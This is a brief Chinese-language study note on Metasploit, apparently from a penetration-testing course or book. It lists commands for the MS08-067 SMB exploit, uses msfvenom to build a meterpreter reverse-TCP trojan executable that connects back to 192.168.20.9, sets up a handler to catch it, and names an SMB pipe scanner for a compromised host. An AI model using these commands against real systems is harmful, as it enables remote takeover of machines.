# 第四章 Metasploit

`search ms08-067`
`info exploit/windows/smb/ms08_067_netapi`
`use windows/smb/ms08_067_netapi`
`show options`

## Msfvenom
- `msfvenom -l payloads` 查看可用payloads
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > haha.exe`如此制作了一个木马
- `use multi/handler`
    `set LHOST 192.168.20.9`
    `set LPORT 12345`
    `exploit`
    这样就可以监听了
    
## SMBPIPE
SMBPIPE是使用SMB服务的通道，可能会有各种通道，我们选择的是Browser通道，看肉鸡开了那个通道可以通过
`user scanner/smb/pipe_auditor`来知道

